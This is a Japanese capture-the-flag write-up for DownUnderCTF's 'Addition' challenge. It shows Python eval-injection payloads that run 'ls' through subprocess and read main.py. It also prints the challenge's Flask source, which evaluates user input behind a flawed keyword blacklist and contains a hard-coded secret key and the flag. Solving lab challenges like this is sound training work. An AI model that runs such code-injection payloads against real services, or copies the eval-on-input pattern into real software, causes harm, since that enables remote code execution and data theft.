# Addition:misc:200pts
Joe is aiming to become the next supreme coder by trying to make his code smaller and smaller. His most recent project is a simple calculator which he reckons is super secure because of the "filters" he has in place. However, he thinks that he knows more than everyone around him. Put Joe in his place and grab the flag.  
[https://chal.duc.tf:30302/](https://chal.duc.tf:30302/)  

# Solution
URLにアクセスすると以下のようなサイトだった。  
Joe's Supreme calculator  
[site1.png](site/site1.png)  
不適切な入力をしてみてもエラー内容は表示されないようだ。  
printも表示されない。  
pythonらしいので、以下を実行してみる。  
```python
__import__("subprocess").check_output(["ls","-al","."])
```
[site2.png](site/site2.png)  
整形すると以下になる。  
```text
total 32
drwxr-xr-x 1 root root 4096 Sep 19 10:07 .
drwxr-xr-x 1 root root 4096 Sep 19 10:07 ..
drwxr-xr-x 2 root root 4096 Sep 19 10:07 __pycache__
-rw-r--r-- 1 root root 1371 Sep 9 07:18 main.py
-rw-r--r-- 1 root root 202 Aug 16 16:49 prestart.sh
drwxr-xr-x 2 root root 4096 Sep 13 05:41 templates
-rw-r--r-- 1 root root 37 Aug 16 16:49 uwsgi.ini
```
main.pyをreadする。  
```python
open("main.py","rb").read()
```
[site3.png](site/site3.png)  
整形すると以下になる。  
```python:main.py
from flask_wtf import FlaskForm
from flask import Flask, render_template, request
from wtforms import Form, validators, StringField, SubmitField

app = Flask(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'

blacklist = ["import", "os", "sys", ";", "print", "__import__", "SECRET", "KEY", "app", "open", "globals"]
maybe_not_maybe_this = "HYPA HYPA"
maybe_this_maybe_not = "DUCTF{3v4L_1s_D4ng3r0u5}"

class CalculatorInput(FlaskForm):
	user_input = StringField('Calculation', validators=[validators.DataRequired()]) 
	submit = SubmitField('Calculate for me')

@app.route("/", methods=["GET", "POST"])
def mainpage():	
	form = CalculatorInput()
	out = ""
	if request.method == 'POST':
		user_input = request.form['user_input']
		
		for items in blacklist:
			if items in user_input:
				out = "Nice try....NOT. If you want to break my code you need to try harder"
			else:
				try:
					# Pass the users input in a eval function so that I dont have to write a lot of code and worry about doing the calculation myself
					out = eval(user_input)
				except:
					out = "You caused an error... because my friend told me showing errors to hackers can be problematic I am not going to tell you what you broke"
		
	return render_template("calculator.html", form=form, out=out)

if __name__ == "__main__":
 app.run(host="0.0.0.0", debug=True, port=6969)
```
blacklistとは…  
flagが書かれていた。  

## DUCTF{3v4L_1s_D4ng3r0u5}